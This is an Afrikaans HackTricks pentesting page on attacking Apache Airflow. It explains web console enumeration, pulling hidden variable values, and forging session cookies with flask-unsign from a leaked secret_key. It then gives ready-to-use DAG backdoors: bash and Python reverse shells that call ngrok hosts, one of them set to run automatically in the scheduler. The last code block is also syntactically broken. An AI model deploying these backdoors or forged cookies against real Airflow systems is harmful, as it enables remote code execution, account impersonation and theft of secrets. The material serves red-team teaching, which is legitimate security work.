# Apache Airflow Sekuriteit

<details>

{% hint style="success" %}
Leer & oefen AWS Hack: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Leer & oefen GCP Hack: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kontroleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
{% endhint %}

## Basiese Inligting

[**Apache Airflow**](https://airflow.apache.org) dien as 'n platform vir **die orkestrering en skedulering van data-pyplyne of werkstrome**. Die term "orkestrering" in die konteks van data-pyplyne dui op die proses van die re√´l, ko√∂rdineer en bestuur van komplekse data-werkvloei wat uit verskeie bronne voortspruit. Die prim√™re doel van hierdie georkestreerde data-pyplyne is om verwerkte en verbruikbare datastelle te voorsien. Hierdie datastelle word wyd gebruik deur 'n verskeidenheid van toepassings, insluitend maar nie beperk tot besigheidsintelligensie-instrumente, datawetenskap en masjienleermodelle, wat almal fundamenteel is vir die werking van groot data-toepassings.

Basies sal Apache Airflow jou toelaat om **die uitvoering van kode te skeduleer wanneer iets** (gebeurtenis, cron) **gebeur**.

## Plaaslike Laboratorium

### Docker-Compose

Jy kan die **docker-compose konfigurasie l√™er van** [**https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml**](https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml) gebruik om 'n volledige Apache Airflow-docker-omgewing te begin. (As jy op MacOS is, maak seker om ten minste 6GB RAM aan die docker VM te gee).

### Minikube

Een maklike manier om **Apache Airflow te hardloop** is om dit **met minikube te hardloop**:
```bash
helm repo add airflow-stable https://airflow-helm.github.io/charts
helm repo update
helm install airflow-release airflow-stable/airflow
# Some information about how to aceess the web console will appear after this command

# Use this command to delete it
helm delete airflow-release
```
## Airflow Konfigurasie

Airflow kan **sensitiewe inligting** in sy konfigurasie stoor of jy kan swak konfigurasies aantref:

{% content-ref url="airflow-configuration.md" %}
[airflow-configuration.md](airflow-configuration.md)
{% endcontent-ref %}

## Airflow RBAC

Voordat jy Airflow aanval, moet jy verstaan **hoe toestemmings werk**:

{% content-ref url="airflow-rbac.md" %}
[airflow-rbac.md](airflow-rbac.md)
{% endcontent-ref %}

## Aanvalle

### Webkonsol Enumerasie

As jy **toegang tot die webkonsol** het, kan jy dalk toegang h√™ tot een of al die volgende inligting:

* **Veranderlikes** (Aangepaste sensitiewe inligting kan hier gestoor word)
* **Verbindings** (Aangepaste sensitiewe inligting kan hier gestoor word)
* Toegang tot hulle in `http://<airflow>/connection/list/`
* [**Konfigurasie**](./#airflow-configuration) (Sensitiewe inligting soos die **`secret_key`** en wagwoorde kan hier gestoor word)
* Lys **gebruikers & rolle**
* **Kode van elke DAG** (wat interessante inligting kan bevat)

### Haal Veranderlike Waardes Op

Veranderlikes kan in Airflow gestoor word sodat die **DAGs** hul waardes kan **bereik**. Dit is soortgelyk aan geheime van ander platforms. As jy **genoeg toestemmings** het, kan jy hulle in die GUI bereik by `http://<airflow>/variable/list/`.\
Airflow sal standaard die waarde van die veranderlike in die GUI wys, maar volgens [**hierdie**](https://marclamberti.com/blog/variables-with-apache-airflow/) is dit moontlik om 'n **lys van veranderlikes** in te stel waarvan die **waarde** as **asteriskteken** in die **GUI** sal verskyn.

![](<../../.gitbook/assets/image (164).png>)

Nietemin kan hierdie **waardes** steeds **opgehaal** word via **CLI** (jy moet DB-toegang h√™), **arbitr√™re DAG**-uitvoering, **API** wat die veranderlikes-eindpunt benader (die API moet geaktiveer wees), en **selfs die GUI self!**\
Om toegang tot daardie waardes vanuit die GUI te verkry, **kies die veranderlikes** wat jy wil bereik en **klik op Handelinge -> Uitvoer**.\
'n Ander manier is om 'n **bruteforce** uit te voer vir die **verborge waarde** deur die **soekfiltering** te gebruik totdat jy dit kry:

![](<../../.gitbook/assets/image (152).png>)

### Voorregskaping

As die **`expose_config`**-konfigurasie op **Waar** ingestel is, kan vanaf die **rol Gebruiker** en **daarbo** die **konfig in die web** **gelees** word. In hierdie konfigurasie verskyn die **`secret_key`**, wat beteken enige gebruiker met hierdie geldige sleutel kan **sy eie ondertekende koekie skep om enige ander gebruikersrekening te impersoneer**.
```bash
flask-unsign --sign --secret '<secret_key>' --cookie "{'_fresh': True, '_id': '12345581593cf26619776d0a1e430c412171f4d12a58d30bef3b2dd379fc8b3715f2bd526eb00497fcad5e270370d269289b65720f5b30a39e5598dad6412345', '_permanent': True, 'csrf_token': '09dd9e7212e6874b104aad957bbf8072616b8fbc', 'dag_status_filter': 'all', 'locale': 'en', 'user_id': '1'}"
```
### DAG Agterdeur (RCE in Airflow werker)

Indien jy **skryftoegang** het tot die plek waar die **DAGs gestoor word**, kan jy net **een skep** wat jou 'n **omgekeerde skaal** sal stuur.\
Let wel dat hierdie omgekeerde skaal binne 'n **airflow werker houer** uitgevoer sal word:
```python
import pendulum
from airflow import DAG
from airflow.operators.bash import BashOperator

with DAG(
dag_id='rev_shell_bash',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = BashOperator(
task_id='run',
bash_command='bash -i >& /dev/tcp/8.tcp.ngrok.io/11433  0>&1',
)
```

```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

with DAG(
dag_id='rev_shell_python',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python',
python_callable=rs,
op_kwargs={"rhost":"8.tcp.ngrok.io", "port": 11433}
)
```
### DAG Agterdeur (RCE in Airflow skeduleerder)

Indien jy iets instel om **uitgevoer te word in die hoof van die kode**, sal dit op die oomblik van hierdie skrywe **uitgevoer word deur die skeduleerder** na 'n paar sekondes nadat dit binne die DAG se vouer geplaas is.
```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

rs("2.tcp.ngrok.io", 14403)

with DAG(
dag_id='rev_shell_python2',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python2',
python_callable=rs,
op_kwargs={"rhost":"2.tcp.ngrok.io", "port": 144}
```
### DAG Skepping

As jy daarin slaag om 'n masjien binne die DAG-kluster te **kompromiteer**, kan jy nuwe **DAG-skripte** in die `dags/`-vouer skep en hulle sal **gerepliseer word in die res van die masjiene** binne die DAG-kluster.

### DAG Kode-inspuiting

Wanneer jy 'n DAG van die GUI uitvoer, kan jy **argumnte daaraan deurgee**.\
Daarom, as die DAG nie behoorlik gekodeer is nie, kan dit **kwesbaar wees vir Bevelinspuiting.**\
Dit is wat in hierdie CVE gebeur het: [https://www.exploit-db.com/exploits/49927](https://www.exploit-db.com/exploits/49927)

Al wat jy moet weet om te **begin soek na bevelinspuitings in DAGs**, is dat **parameters** **toegang kry** met die kode **`dag_run.conf.get("param_name")`**.

Verder kan dieselfde kwesbaarheid voorkom met **veranderlikes** (let daarop dat met genoeg voorregte jy die waarde van die veranderlikes in die GUI kan **beheer**). Veranderlikes word **toegang met**:
```python
from airflow.models import Variable
[...]
foo = Variable.get("foo")
```
Indien hulle byvoorbeeld binne 'n bash-opdrag gebruik word, kan jy 'n opdraginspuiting uitvoer.

<details>

{% hint style="success" %}
Leer & oefen AWS-hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Leer & oefen GCP-hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kontroleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
{% endhint %}
